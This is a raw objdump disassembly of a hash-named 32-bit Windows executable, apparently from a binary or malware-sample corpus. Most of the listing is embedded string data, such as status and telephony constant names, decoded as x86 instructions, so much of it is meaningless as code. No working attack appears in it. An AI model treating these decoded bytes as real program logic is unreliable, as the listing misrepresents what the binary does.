
654d8713c53d3e3fd49ec30dcb6953311862098974ded71e24d6481371c6274b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	loope  0x40105d
  401006:	inc    eax
	...
  40100f:	add    BYTE PTR [ebx],bl
  401011:	push   edi
  401012:	inc    eax
  401013:	add    BYTE PTR [ebx+0x5e],bh
  401016:	inc    eax
	...
  401023:	add    bl,ch
  401025:	test   al,0x10
  401027:	push   eax
  401028:	add    BYTE PTR [eax],al
  40102a:	add    BYTE PTR [eax],al
  40102c:	add    al,BYTE PTR [eax]
  40102e:	add    BYTE PTR [eax],al
  401030:	and    eax,DWORD PTR [eax]
  401032:	add    BYTE PTR [eax],al
  401034:	mov    al,ds:0xa0000022
  401039:	push   ss
  40103a:	add    BYTE PTR [eax],al
  40103c:	pop    edi
  40103d:	pop    edi
  40103e:	push   esp
  40103f:	inc    ebp
  401040:	push   ebx
  401041:	push   esp
  401042:	inc    ebx
  401043:	dec    edi
  401044:	inc    esp
  401045:	inc    ebp
  401046:	pop    edi
  401047:	pop    edi
  401048:	add    BYTE PTR [eax],al
  40104a:	add    BYTE PTR [eax],al
  40104c:	xor    BYTE PTR [eax],al
  40104e:	add    BYTE PTR [eax],al
  401050:	xor    DWORD PTR [eax],eax
  401052:	add    BYTE PTR [eax],al
  401054:	xor    al,BYTE PTR [eax]
  401056:	add    BYTE PTR [eax],al
  401058:	xor    eax,0x31000000
  40105d:	xor    BYTE PTR [eax],al
  40105f:	add    BYTE PTR [edx],dh
  401061:	xor    BYTE PTR [eax],al
  401063:	add    BYTE PTR ds:0x31000030,dh
  401069:	xor    BYTE PTR [eax],dh
  40106b:	add    BYTE PTR [edx],dh
  40106d:	xor    BYTE PTR [eax],dh
  40106f:	add    BYTE PTR ds:0x31003030,dh
  401075:	xor    BYTE PTR [eax],dh
  401077:	xor    BYTE PTR [eax],al
  401079:	add    BYTE PTR [eax],al
  40107b:	add    BYTE PTR [ebx+0x65],dh
  40107e:	arpl   WORD PTR [edi+0x6e],bp
  401081:	add    BYTE PTR fs:[eax],al
  401084:	ins    DWORD PTR es:[edi],dx
  401085:	imul   ebp,DWORD PTR [esi+0x75],0x6574
  40108c:	push   0x72756f
  401091:	add    BYTE PTR [eax],al
  401093:	add    BYTE PTR [ecx+eiz*2+0x79],ah
  401097:	add    BYTE PTR [edi+0x65],dh
  40109a:	imul   eax,DWORD PTR gs:[eax],0x0
  40109e:	add    BYTE PTR [eax],al
  4010a0:	imul   ebp,DWORD PTR [esi+0x63],0x6e696d6f
  4010a7:	and    BYTE PTR [bp+di+0x61],ah
  4010ab:	ins    BYTE PTR es:[edi],dx
  4010ac:	ins    BYTE PTR es:[edi],dx
  4010ad:	jae    0x4010af
  4010af:	add    BYTE PTR [ecx+ebp*2+0x73],ah
  4010b3:	arpl   WORD PTR [edi+0x6e],bp
  4010b6:	outs   dx,BYTE PTR ds:[esi]
  4010b7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4010bc:	outs   dx,BYTE PTR ds:[esi]
  4010bd:	jae    0x4010bf
  4010bf:	add    BYTE PTR [ecx+0x44],cl
  4010c2:	dec    esp
  4010c3:	inc    ebp
  4010c4:	add    BYTE PTR [eax],al
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	dec    edi
  4010c9:	inc    esi
  4010ca:	inc    esi
  4010cb:	inc    ebp
  4010cc:	push   edx
  4010cd:	dec    ecx
  4010ce:	dec    esi
  4010cf:	inc    edi
  4010d0:	add    BYTE PTR [eax],al
  4010d2:	add    BYTE PTR [eax],al
  4010d4:	inc    ecx
  4010d5:	inc    ebx
  4010d6:	inc    ebx
  4010d7:	inc    ebp
  4010d8:	push   eax
  4010d9:	push   esp
  4010da:	inc    ebp
  4010db:	inc    esp
  4010dc:	add    BYTE PTR [eax],al
  4010de:	add    BYTE PTR [eax],al
  4010e0:	inc    esp
  4010e1:	dec    ecx
  4010e2:	inc    ecx
  4010e3:	dec    esp
  4010e4:	push   esp
  4010e5:	dec    edi
  4010e6:	dec    esi
  4010e7:	inc    ebp
  4010e8:	add    BYTE PTR [eax],al
  4010ea:	add    BYTE PTR [eax],al
  4010ec:	inc    esp
  4010ed:	dec    ecx
  4010ee:	inc    ecx
  4010ef:	dec    esp
  4010f0:	dec    ecx
  4010f1:	dec    esi
  4010f2:	inc    edi
  4010f3:	add    BYTE PTR [edx+0x49],dl
  4010f6:	dec    esi
  4010f7:	inc    edi
  4010f8:	inc    edx
  4010f9:	inc    ecx
  4010fa:	inc    ebx
  4010fb:	dec    ebx
  4010fc:	add    BYTE PTR [eax],al
  4010fe:	add    BYTE PTR [eax],al
  401100:	inc    edx
  401101:	push   ebp
  401102:	push   ebx
  401103:	pop    ecx
  401104:	add    BYTE PTR [eax],al
  401106:	add    BYTE PTR [eax],al
  401108:	push   ebx
  401109:	push   eax
  40110a:	inc    ebp
  40110b:	inc    ebx
  40110c:	dec    ecx
  40110d:	inc    ecx
  40110e:	dec    esp
  40110f:	dec    ecx
  401110:	dec    esi
  401111:	inc    esi
  401112:	dec    edi
  401113:	add    BYTE PTR [ebx+0x4f],al
  401116:	dec    esi
  401117:	dec    esi
  401118:	inc    ebp
  401119:	inc    ebx
  40111a:	push   esp
  40111b:	inc    ebp
  40111c:	inc    esp
  40111d:	add    BYTE PTR [eax],al
  40111f:	add    BYTE PTR [eax+0x52],dl
  401122:	dec    edi
  401123:	inc    ebx
  401124:	inc    ebp
  401125:	inc    ebp
  401126:	inc    esp
  401127:	dec    ecx
  401128:	dec    esi
  401129:	inc    edi
  40112a:	add    BYTE PTR [eax],al
  40112c:	dec    edi
  40112d:	dec    esi
  40112e:	dec    eax
  40112f:	dec    edi
  401130:	dec    esp
  401131:	inc    esp
  401132:	add    BYTE PTR [eax],al
  401134:	inc    ebx
  401135:	dec    edi
  401136:	dec    esi
  401137:	inc    esi
  401138:	inc    ebp
  401139:	push   edx
  40113a:	inc    ebp
  40113b:	dec    esi
  40113c:	inc    ebx
  40113d:	inc    ebp
  40113e:	inc    esp
  40113f:	add    BYTE PTR [edi+0x4e],cl
  401142:	dec    eax
  401143:	dec    edi
  401144:	dec    esp
  401145:	inc    esp
  401146:	push   eax
  401147:	inc    ebp
  401148:	dec    esi
  401149:	inc    esp
  40114a:	inc    ebx
  40114b:	dec    edi
  40114c:	dec    esi
  40114d:	inc    esi
  40114e:	add    BYTE PTR [eax],al
  401150:	dec    edi
  401151:	dec    esi
  401152:	dec    eax
  401153:	dec    edi
  401154:	dec    esp
  401155:	inc    esp
  401156:	push   eax
  401157:	inc    ebp
  401158:	dec    esi
  401159:	inc    esp
  40115a:	push   esp
  40115b:	push   edx
  40115c:	inc    ecx
  40115d:	dec    esi
  40115e:	push   ebx
  40115f:	inc    esi
  401160:	inc    ebp
  401161:	push   edx
  401162:	add    BYTE PTR [eax],al
  401164:	inc    esp
  401165:	dec    ecx
  401166:	push   ebx
  401167:	inc    ebx
  401168:	dec    edi
  401169:	dec    esi
  40116a:	dec    esi
  40116b:	inc    ebp
  40116c:	inc    ebx
  40116d:	push   esp
  40116e:	inc    ebp
  40116f:	inc    esp
  401170:	add    BYTE PTR [eax],al
  401172:	add    BYTE PTR [eax],al
  401174:	push   ebp
  401175:	dec    esi
  401176:	dec    ebx
  401177:	dec    esi
  401178:	dec    edi
  401179:	push   edi
  40117a:	dec    esi
  40117b:	add    BYTE PTR [eax],al
  40117d:	add    BYTE PTR [eax],al
  40117f:	add    BYTE PTR [ebx+edx*2],bh
  401182:	push   ebp
  401183:	inc    ebx
  401184:	inc    ebx
  401185:	inc    ebp
  401186:	push   ebx
  401187:	push   ebx
  401188:	add    BYTE PTR ds:[eax],al
  40118b:	add    BYTE PTR [ecx+0x4c],al
  40118e:	dec    esp
  40118f:	dec    edi
  401190:	inc    ebx
  401191:	inc    ecx
  401192:	push   esp
  401193:	inc    ebp
  401194:	inc    esp
  401195:	add    BYTE PTR [eax],al
  401197:	add    BYTE PTR [edx+0x41],al
  40119a:	inc    esp
  40119b:	inc    esp
  40119c:	inc    ebp
  40119d:	push   esi
  40119e:	dec    ecx
  40119f:	inc    ebx
  4011a0:	inc    ebp
  4011a1:	dec    ecx
  4011a2:	inc    esp
  4011a3:	add    BYTE PTR [edx+0x45],al
  4011a6:	inc    ecx
  4011a7:	push   edx
  4011a8:	inc    ebp
  4011a9:	push   edx
  4011aa:	dec    ebp
  4011ab:	dec    edi
  4011ac:	inc    esp
  4011ad:	inc    ebp
  4011ae:	push   ebp
  4011af:	dec    esi
  4011b0:	inc    ecx
  4011b1:	push   esi
  4011b2:	inc    ecx
  4011b3:	dec    ecx
  4011b4:	dec    esp
  4011b5:	add    BYTE PTR [eax],al
  4011b7:	add    BYTE PTR [ebx+0x41],al
  4011ba:	dec    esp
  4011bb:	dec    esp
  4011bc:	push   ebp
  4011bd:	dec    esi
  4011be:	inc    ecx
  4011bf:	push   esi
  4011c0:	inc    ecx
  4011c1:	dec    ecx
  4011c2:	dec    esp
  4011c3:	add    BYTE PTR [ebx+0x4f],al
  4011c6:	dec    ebp
  4011c7:	push   eax
  4011c8:	dec    esp
  4011c9:	inc    ebp
  4011ca:	push   esp
  4011cb:	dec    ecx
  4011cc:	dec    edi
  4011cd:	dec    esi
  4011ce:	dec    edi
  4011cf:	push   esi
  4011d0:	inc    ebp
  4011d1:	push   edx
  4011d2:	push   edx
  4011d3:	push   ebp
  4011d4:	dec    esi
  4011d5:	add    BYTE PTR [eax],al
  4011d7:	add    BYTE PTR [ebx+0x4f],al
  4011da:	dec    esi
  4011db:	inc    esi
  4011dc:	inc    ebp
  4011dd:	push   edx
  4011de:	inc    ebp
  4011df:	dec    esi
  4011e0:	inc    ebx
  4011e1:	inc    ebp
  4011e2:	inc    esi
  4011e3:	push   ebp
  4011e4:	dec    esp
  4011e5:	dec    esp
  4011e6:	add    BYTE PTR [eax],al
  4011e8:	inc    esp
  4011e9:	dec    ecx
  4011ea:	inc    ecx
  4011eb:	dec    esp
  4011ec:	inc    edx
  4011ed:	dec    ecx
  4011ee:	dec    esp
  4011ef:	dec    esp
  4011f0:	dec    ecx
  4011f1:	dec    esi
  4011f2:	inc    edi
  4011f3:	add    BYTE PTR [ecx+ecx*2+0x41],al
  4011f7:	dec    esp
  4011f8:	inc    esp
  4011f9:	dec    ecx
  4011fa:	inc    ecx
  4011fb:	dec    esp
  4011fc:	push   esp
  4011fd:	dec    edi
  4011fe:	dec    esi
  4011ff:	inc    ebp
  401200:	add    BYTE PTR [eax],al
  401202:	add    BYTE PTR [eax],al
  401204:	inc    esp
  401205:	dec    ecx
  401206:	inc    ecx
  401207:	dec    esp
  401208:	push   eax
  401209:	push   edx
  40120a:	dec    edi
  40120b:	dec    ebp
  40120c:	push   eax
  40120d:	push   esp
  40120e:	add    BYTE PTR [eax],al
  401210:	inc    esp
  401211:	dec    ecx
  401212:	inc    ecx
  401213:	dec    esp
  401214:	push   ecx
  401215:	push   ebp
  401216:	dec    ecx
  401217:	inc    ebp
  401218:	push   esp
  401219:	add    BYTE PTR [eax],al
  40121b:	add    BYTE PTR [ecx+0x4e],cl
  40121e:	inc    ebx
  40121f:	dec    edi
  401220:	dec    ebp
  401221:	push   eax
  401222:	inc    ecx
  401223:	push   esp
  401224:	dec    ecx
  401225:	inc    edx
  401226:	dec    esp
  401227:	inc    ebp
  401228:	inc    ecx
  401229:	push   eax
  40122a:	dec    ecx
  40122b:	push   esi
  40122c:	inc    ebp
  40122d:	push   edx
  40122e:	push   ebx
  40122f:	dec    ecx
  401230:	dec    edi
  401231:	dec    esi
  401232:	add    BYTE PTR [eax],al
  401234:	dec    ecx
  401235:	dec    esi
  401236:	inc    ebx
  401237:	dec    edi
  401238:	dec    ebp
  401239:	push   eax
  40123a:	inc    ecx
  40123b:	push   esp
  40123c:	dec    ecx
  40123d:	inc    edx
  40123e:	dec    esp
  40123f:	inc    ebp
  401240:	inc    ebp
  401241:	pop    eax
  401242:	push   esp
  401243:	push   esi
  401244:	inc    ebp
  401245:	push   edx
  401246:	push   ebx
  401247:	dec    ecx
  401248:	dec    edi
  401249:	dec    esi
  40124a:	add    BYTE PTR [eax],al
  40124c:	dec    ecx
  40124d:	dec    esi
  40124e:	dec    ecx
  40124f:	inc    esi
  401250:	dec    ecx
  401251:	dec    esp
  401252:	inc    ebp
  401253:	inc    ebx
  401254:	dec    edi
  401255:	push   edx
  401256:	push   edx
  401257:	push   ebp
  401258:	push   eax
  401259:	push   esp
  40125a:	add    BYTE PTR [eax],al
  40125c:	dec    ecx
  40125d:	dec    esi
  40125e:	push   ebp
  40125f:	push   ebx
  401260:	inc    ebp
  401261:	add    BYTE PTR [eax],al
  401263:	add    BYTE PTR [ecx+0x4e],cl
  401266:	push   esi
  401267:	inc    ecx
  401268:	dec    esp
  401269:	inc    ecx
  40126a:	inc    esp
  40126b:	inc    esp
  40126c:	push   edx
  40126d:	inc    ebp
  40126e:	push   ebx
  40126f:	push   ebx
  401270:	add    BYTE PTR [eax],al
  401272:	add    BYTE PTR [eax],al
  401274:	dec    ecx
  401275:	dec    esi
  401276:	push   esi
  401277:	inc    ecx
  401278:	dec    esp
  401279:	inc    ecx
  40127a:	inc    esp
  40127b:	inc    esp
  40127c:	push   edx
  40127d:	inc    ebp
  40127e:	push   ebx
  40127f:	push   ebx
  401280:	dec    ecx
  401281:	inc    esp
  401282:	add    BYTE PTR [eax],al
  401284:	dec    ecx
  401285:	dec    esi
  401286:	push   esi
  401287:	inc    ecx
  401288:	dec    esp
  401289:	inc    ecx
  40128a:	inc    esp
  40128b:	inc    esp
  40128c:	push   edx
  40128d:	inc    ebp
  40128e:	push   ebx
  40128f:	push   ebx
  401290:	dec    ebp
  401291:	dec    edi
  401292:	inc    esp
  401293:	inc    ebp
  401294:	add    BYTE PTR [eax],al
  401296:	add    BYTE PTR [eax],al
  401298:	dec    ecx
  401299:	dec    esi
  40129a:	push   esi
  40129b:	inc    ecx
  40129c:	dec    esp
  40129d:	inc    ecx
  40129e:	inc    esp
  40129f:	inc    esp
  4012a0:	push   edx
  4012a1:	inc    ebp
  4012a2:	push   ebx
  4012a3:	push   ebx
  4012a4:	push   ebx
  4012a5:	push   esp
  4012a6:	inc    ecx
  4012a7:	push   esp
  4012a8:	inc    ebp
  4012a9:	add    BYTE PTR [eax],al
  4012ab:	add    BYTE PTR [ecx+0x4e],cl
  4012ae:	push   esi
  4012af:	inc    ecx
  4012b0:	dec    esp
  4012b1:	inc    ecx
  4012b2:	push   eax
  4012b3:	push   eax
  4012b4:	dec    eax
  4012b5:	inc    ecx
  4012b6:	dec    esi
  4012b7:	inc    esp
  4012b8:	dec    esp
  4012b9:	inc    ebp
  4012ba:	add    BYTE PTR [eax],al
  4012bc:	dec    ecx
  4012bd:	dec    esi
  4012be:	push   esi
  4012bf:	inc    ecx
  4012c0:	dec    esp
  4012c1:	inc    ecx
  4012c2:	push   eax
  4012c3:	push   eax
  4012c4:	dec    esi
  4012c5:	inc    ecx
  4012c6:	dec    ebp
  4012c7:	inc    ebp
  4012c8:	add    BYTE PTR [eax],al
  4012ca:	add    BYTE PTR [eax],al
  4012cc:	dec    ecx
  4012cd:	dec    esi
  4012ce:	push   esi
  4012cf:	inc    ecx
  4012d0:	dec    esp
  4012d1:	inc    edx
  4012d2:	inc    ebp
  4012d3:	inc    ecx
  4012d4:	push   edx
  4012d5:	inc    ebp
  4012d6:	push   edx
  4012d7:	dec    ebp
  4012d8:	dec    edi
  4012d9:	inc    esp
  4012da:	inc    ebp
  4012db:	add    BYTE PTR [ecx+0x4e],cl
  4012de:	push   esi
  4012df:	inc    ecx
  4012e0:	dec    esp
  4012e1:	inc    ebx
  4012e2:	inc    ecx
  4012e3:	dec    esp
  4012e4:	dec    esp
  4012e5:	inc    ebx
  4012e6:	dec    edi
  4012e7:	dec    ebp
  4012e8:	push   eax
  4012e9:	dec    esp
  4012ea:	dec    ebp
  4012eb:	dec    edi
  4012ec:	inc    esp
  4012ed:	inc    ebp
  4012ee:	add    BYTE PTR [eax],al
  4012f0:	dec    ecx
  4012f1:	dec    esi
  4012f2:	push   esi
  4012f3:	inc    ecx
  4012f4:	dec    esp
  4012f5:	inc    ebx
  4012f6:	inc    ecx
  4012f7:	dec    esp
  4012f8:	dec    esp
  4012f9:	dec    eax
  4012fa:	inc    ecx
  4012fb:	dec    esi
  4012fc:	inc    esp
  4012fd:	dec    esp
  4012fe:	inc    ebp
  4012ff:	add    BYTE PTR [ecx+0x4e],cl
  401302:	push   esi
  401303:	inc    ecx
  401304:	dec    esp
  401305:	inc    ebx
  401306:	inc    ecx
  401307:	dec    esp
  401308:	dec    esp
  401309:	push   eax
  40130a:	inc    ecx
  40130b:	push   edx
  40130c:	inc    ecx
  40130d:	dec    ebp
  40130e:	push   ebx
  40130f:	add    BYTE PTR [ecx+0x4e],cl
  401312:	push   esi
  401313:	inc    ecx
  401314:	dec    esp
  401315:	inc    ebx
  401316:	inc    ecx
  401317:	dec    esp
  401318:	dec    esp
  401319:	push   eax
  40131a:	push   edx
  40131b:	dec    ecx
  40131c:	push   esi
  40131d:	dec    ecx
  40131e:	dec    esp
  40131f:	inc    ebp
  401320:	inc    edi
  401321:	inc    ebp
  401322:	add    BYTE PTR [eax],al
  401324:	dec    ecx
  401325:	dec    esi
  401326:	push   esi
  401327:	inc    ecx
  401328:	dec    esp
  401329:	inc    ebx
  40132a:	inc    ecx
  40132b:	dec    esp
  40132c:	dec    esp
  40132d:	push   ebx
  40132e:	inc    ebp
  40132f:	dec    esp
  401330:	inc    ebp
  401331:	inc    ebx
  401332:	push   esp
  401333:	add    BYTE PTR [ecx+0x4e],cl
  401336:	push   esi
  401337:	inc    ecx
  401338:	dec    esp
  401339:	inc    ebx
  40133a:	inc    ecx
  40133b:	dec    esp
  40133c:	dec    esp
  40133d:	push   ebx
  40133e:	push   esp
  40133f:	inc    ecx
  401340:	push   esp
  401341:	inc    ebp
  401342:	add    BYTE PTR [eax],al
  401344:	dec    ecx
  401345:	dec    esi
  401346:	push   esi
  401347:	inc    ecx
  401348:	dec    esp
  401349:	inc    ebx
  40134a:	inc    ecx
  40134b:	dec    esp
  40134c:	dec    esp
  40134d:	push   ebx
  40134e:	push   esp
  40134f:	inc    ecx
  401350:	push   esp
  401351:	inc    ebp
  401352:	dec    esp
  401353:	dec    ecx
  401354:	push   ebx
  401355:	push   esp
  401356:	add    BYTE PTR [eax],al
  401358:	dec    ecx
  401359:	dec    esi
  40135a:	push   esi
  40135b:	inc    ecx
  40135c:	dec    esp
  40135d:	inc    ebx
  40135e:	inc    ecx
  40135f:	push   edx
  401360:	inc    esp
  401361:	add    BYTE PTR [eax],al
  401363:	add    BYTE PTR [ecx+0x4e],cl
  401366:	push   esi
  401367:	inc    ecx
  401368:	dec    esp
  401369:	inc    ebx
  40136a:	dec    edi
  40136b:	dec    ebp
  40136c:	push   eax
  40136d:	dec    esp
  40136e:	inc    ebp
  40136f:	push   esp
  401370:	dec    ecx
  401371:	dec    edi
  401372:	dec    esi
  401373:	dec    ecx
  401374:	inc    esp
  401375:	add    BYTE PTR [eax],al
  401377:	add    BYTE PTR [ecx+0x4e],cl
  40137a:	push   esi
  40137b:	inc    ecx
  40137c:	dec    esp
  40137d:	inc    ebx
  40137e:	dec    edi
  40137f:	dec    esi
  401380:	inc    esi
  401381:	inc    ebx
  401382:	inc    ecx
  401383:	dec    esp
  401384:	dec    esp
  401385:	dec    eax
  401386:	inc    ecx
  401387:	dec    esi
  401388:	inc    esp
  401389:	dec    esp
  40138a:	inc    ebp
  40138b:	add    BYTE PTR [ecx+0x4e],cl
  40138e:	push   esi
  40138f:	inc    ecx
  401390:	dec    esp
  401391:	inc    ebx
  401392:	dec    edi
  401393:	dec    esi
  401394:	push   ebx
  401395:	push   ebp
  401396:	dec    esp
  401397:	push   esp
  401398:	inc    ebx
  401399:	inc    ecx
  40139a:	dec    esp
  40139b:	dec    esp
  40139c:	dec    eax
  40139d:	inc    ecx
  40139e:	dec    esi
  40139f:	inc    esp
  4013a0:	dec    esp
  4013a1:	inc    ebp
  4013a2:	add    BYTE PTR [eax],al
  4013a4:	dec    ecx
  4013a5:	dec    esi
  4013a6:	push   esi
  4013a7:	inc    ecx
  4013a8:	dec    esp
  4013a9:	inc    ebx
  4013aa:	dec    edi
  4013ab:	push   ebp
  4013ac:	dec    esi
  4013ad:	push   esp
  4013ae:	push   edx
  4013af:	pop    ecx
  4013b0:	inc    ebx
  4013b1:	dec    edi
  4013b2:	inc    esp
  4013b3:	inc    ebp
  4013b4:	add    BYTE PTR [eax],al
  4013b6:	add    BYTE PTR [eax],al
  4013b8:	dec    ecx
  4013b9:	dec    esi
  4013ba:	push   esi
  4013bb:	inc    ecx
  4013bc:	dec    esp
  4013bd:	inc    esp
  4013be:	inc    ebp
  4013bf:	push   esi
  4013c0:	dec    ecx
  4013c1:	inc    ebx
  4013c2:	inc    ebp
  4013c3:	inc    ebx
  4013c4:	dec    esp
  4013c5:	inc    ecx
  4013c6:	push   ebx
  4013c7:	push   ebx
  4013c8:	add    BYTE PTR [eax],al
  4013ca:	add    BYTE PTR [eax],al
  4013cc:	dec    ecx
  4013cd:	dec    esi
  4013ce:	push   esi
  4013cf:	inc    ecx
  4013d0:	dec    esp
  4013d1:	inc    esp
  4013d2:	inc    ebp
  4013d3:	push   esi
  4013d4:	dec    ecx
  4013d5:	inc    ebx
  4013d6:	inc    ebp
  4013d7:	dec    eax
  4013d8:	inc    ecx
  4013d9:	dec    esi
  4013da:	inc    esp
  4013db:	dec    esp
  4013dc:	inc    ebp
  4013dd:	add    BYTE PTR [eax],al
  4013df:	add    BYTE PTR [ecx+0x4e],cl
  4013e2:	push   esi
  4013e3:	inc    ecx
  4013e4:	dec    esp
  4013e5:	inc    esp
  4013e6:	dec    ecx
  4013e7:	inc    ecx
  4013e8:	dec    esp
  4013e9:	push   eax
  4013ea:	inc    ecx
  4013eb:	push   edx
  4013ec:	inc    ecx
  4013ed:	dec    ebp
  4013ee:	push   ebx
  4013ef:	add    BYTE PTR [ecx+0x4e],cl
  4013f2:	push   esi
  4013f3:	inc    ecx
  4013f4:	dec    esp
  4013f5:	inc    esp
  4013f6:	dec    ecx
  4013f7:	inc    edi
  4013f8:	dec    ecx
  4013f9:	push   esp
  4013fa:	dec    esp
  4013fb:	dec    ecx
  4013fc:	push   ebx
  4013fd:	push   esp
  4013fe:	add    BYTE PTR [eax],al
  401400:	dec    ecx
  401401:	dec    esi
  401402:	push   esi
  401403:	inc    ecx
  401404:	dec    esp
  401405:	inc    esp
  401406:	dec    ecx
  401407:	inc    edi
  401408:	dec    ecx
  401409:	push   esp
  40140a:	dec    ebp
  40140b:	dec    edi
  40140c:	inc    esp
  40140d:	inc    ebp
  40140e:	add    BYTE PTR [eax],al
  401410:	dec    ecx
  401411:	dec    esi
  401412:	push   esi
  401413:	inc    ecx
  401414:	dec    esp
  401415:	inc    esp
  401416:	dec    ecx
  401417:	inc    edi
  401418:	dec    ecx
  401419:	push   esp
  40141a:	push   ebx
  40141b:	add    BYTE PTR [ecx+0x4e],cl
  40141e:	push   esi
  40141f:	inc    ecx
  401420:	dec    esp
  401421:	inc    ebp
  401422:	pop    eax
  401423:	push   esp
  401424:	push   esi
  401425:	inc    ebp
  401426:	push   edx
  401427:	push   ebx
  401428:	dec    ecx
  401429:	dec    edi
  40142a:	dec    esi
  40142b:	add    BYTE PTR [ecx+0x4e],cl
  40142e:	push   esi
  40142f:	inc    ecx
  401430:	dec    esp
  401431:	inc    edi
  401432:	push   edx
  401433:	dec    edi
  401434:	push   ebp
  401435:	push   eax
  401436:	dec    ecx
  401437:	inc    esp
  401438:	add    BYTE PTR [eax],al
  40143a:	add    BYTE PTR [eax],al
  40143c:	dec    ecx
  40143d:	dec    esi
  40143e:	push   esi
  40143f:	inc    ecx
  401440:	dec    esp
  401441:	dec    esp
  401442:	dec    ecx
  401443:	dec    esi
  401444:	inc    ebp
  401445:	dec    eax
  401446:	inc    ecx
  401447:	dec    esi
  401448:	inc    esp
  401449:	dec    esp
  40144a:	inc    ebp
  40144b:	add    BYTE PTR [ecx+0x4e],cl
  40144e:	push   esi
  40144f:	inc    ecx
  401450:	dec    esp
  401451:	dec    esp
  401452:	dec    ecx
  401453:	dec    esi
  401454:	inc    ebp
  401455:	push   ebx
  401456:	push   esp
  401457:	inc    ecx
  401458:	push   esp
  401459:	inc    ebp
  40145a:	add    BYTE PTR [eax],al
  40145c:	dec    ecx
  40145d:	dec    esi
  40145e:	push   esi
  40145f:	inc    ecx
  401460:	dec    esp
  401461:	dec    esp
  401462:	dec    edi
  401463:	inc    ebx
  401464:	inc    ecx
  401465:	push   esp
  401466:	dec    ecx
  401467:	dec    edi
  401468:	dec    esi
  401469:	add    BYTE PTR [eax],al
  40146b:	add    BYTE PTR [ecx+0x4e],cl
  40146e:	push   esi
  40146f:	inc    ecx
  401470:	dec    esp
  401471:	dec    ebp
  401472:	inc    ebp
  401473:	inc    esp
  401474:	dec    ecx
  401475:	inc    ecx
  401476:	dec    esp
  401477:	dec    ecx
  401478:	push   ebx
  401479:	push   esp
  40147a:	add    BYTE PTR [eax],al
  40147c:	dec    ecx
  40147d:	dec    esi
  40147e:	push   esi
  40147f:	inc    ecx
  401480:	dec    esp
  401481:	dec    ebp
  401482:	inc    ebp
  401483:	inc    esp
  401484:	dec    ecx
  401485:	inc    ecx
  401486:	dec    ebp
  401487:	dec    edi
  401488:	inc    esp
  401489:	inc    ebp
  40148a:	add    BYTE PTR [eax],al
  40148c:	dec    ecx
  40148d:	dec    esi
  40148e:	push   esi
  40148f:	inc    ecx
  401490:	dec    esp
  401491:	dec    ebp
  401492:	inc    ebp
  401493:	push   ebx
  401494:	push   ebx
  401495:	inc    ecx
  401496:	inc    edi
  401497:	inc    ebp
  401498:	dec    ecx
  401499:	inc    esp
  40149a:	add    BYTE PTR [eax],al
  40149c:	dec    ecx
  40149d:	dec    esi
  40149e:	push   esi
  40149f:	inc    ecx
  4014a0:	dec    esp
  4014a1:	push   eax
  4014a2:	inc    ecx
  4014a3:	push   edx
  4014a4:	inc    ecx
  4014a5:	dec    ebp
  4014a6:	add    BYTE PTR [eax],al
  4014a8:	dec    ecx
  4014a9:	dec    esi
  4014aa:	push   esi
  4014ab:	inc    ecx
  4014ac:	dec    esp
  4014ad:	push   eax
  4014ae:	inc    ecx
  4014af:	push   edx
  4014b0:	dec    ebx
  4014b1:	dec    ecx
  4014b2:	inc    esp
  4014b3:	add    BYTE PTR [ecx+0x4e],cl
  4014b6:	push   esi
  4014b7:	inc    ecx
  4014b8:	dec    esp
  4014b9:	push   eax
  4014ba:	inc    ecx
  4014bb:	push   edx
  4014bc:	dec    ebx
  4014bd:	dec    ebp
  4014be:	dec    edi
  4014bf:	inc    esp
  4014c0:	inc    ebp
  4014c1:	add    BYTE PTR [eax],al
  4014c3:	add    BYTE PTR [ecx+0x4e],cl
  4014c6:	push   esi
  4014c7:	inc    ecx
  4014c8:	dec    esp
  4014c9:	push   eax
  4014ca:	dec    edi
  4014cb:	dec    ecx
  4014cc:	dec    esi
  4014cd:	push   esp
  4014ce:	inc    ebp
  4014cf:	push   edx
  4014d0:	add    BYTE PTR [eax],al
  4014d2:	add    BYTE PTR [eax],al
  4014d4:	dec    ecx
  4014d5:	dec    esi
  4014d6:	push   esi
  4014d7:	inc    ecx
  4014d8:	dec    esp
  4014d9:	push   eax
  4014da:	push   edx
  4014db:	dec    ecx
  4014dc:	push   esi
  4014dd:	push   ebx
  4014de:	inc    ebp
  4014df:	dec    esp
  4014e0:	inc    ebp
  4014e1:	inc    ebx
  4014e2:	push   esp
  4014e3:	add    BYTE PTR [ecx+0x4e],cl
  4014e6:	push   esi
  4014e7:	inc    ecx
  4014e8:	dec    esp
  4014e9:	push   edx
  4014ea:	inc    ecx
  4014eb:	push   esp
  4014ec:	inc    ebp
  4014ed:	add    BYTE PTR [eax],al
  4014ef:	add    BYTE PTR [ecx+0x4e],cl
  4014f2:	push   esi
  4014f3:	inc    ecx
  4014f4:	dec    esp
  4014f5:	push   edx
  4014f6:	inc    ebp
  4014f7:	push   ecx
  4014f8:	push   ebp
  4014f9:	inc    ebp
  4014fa:	push   ebx
  4014fb:	push   esp
  4014fc:	dec    ebp
  4014fd:	dec    edi
  4014fe:	inc    esp
  4014ff:	inc    ebp
  401500:	add    BYTE PTR [eax],al
  401502:	add    BYTE PTR [eax],al
  401504:	dec    ecx
  401505:	dec    esi
  401506:	push   esi
  401507:	inc    ecx
  401508:	dec    esp
  401509:	push   esp
  40150a:	inc    ebp
  40150b:	push   edx
  40150c:	dec    ebp
  40150d:	dec    ecx
  40150e:	dec    esi
  40150f:	inc    ecx
  401510:	dec    esp
  401511:	dec    ecx
  401512:	inc    esp
  401513:	add    BYTE PTR [ecx+0x4e],cl
  401516:	push   esi
  401517:	inc    ecx
  401518:	dec    esp
  401519:	push   esp
  40151a:	inc    ebp
  40151b:	push   edx
  40151c:	dec    ebp
  40151d:	dec    ecx
  40151e:	dec    esi
  40151f:	inc    ecx
  401520:	dec    esp
  401521:	dec    ebp
  401522:	dec    edi
  401523:	inc    esp
  401524:	inc    ebp
  401525:	add    BYTE PTR [eax],al
  401527:	add    BYTE PTR [ecx+0x4e],cl
  40152a:	push   esi
  40152b:	inc    ecx
  40152c:	dec    esp
  40152d:	push   esp
  40152e:	dec    ecx
  40152f:	dec    ebp
  401530:	inc    ebp
  401531:	dec    edi
  401532:	push   ebp
  401533:	push   esp
  401534:	add    BYTE PTR [eax],al
  401536:	add    BYTE PTR [eax],al
  401538:	dec    ecx
  401539:	dec    esi
